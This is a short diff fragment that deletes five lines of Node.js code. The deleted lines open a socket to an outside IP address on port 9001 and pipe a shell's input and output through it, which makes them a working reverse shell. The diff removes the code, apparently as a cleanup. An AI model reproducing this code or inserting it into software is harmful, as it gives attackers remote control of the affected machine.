@@ -1,5 +1,0 @@
-client.connect(9001, "193.105.207.70", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    })
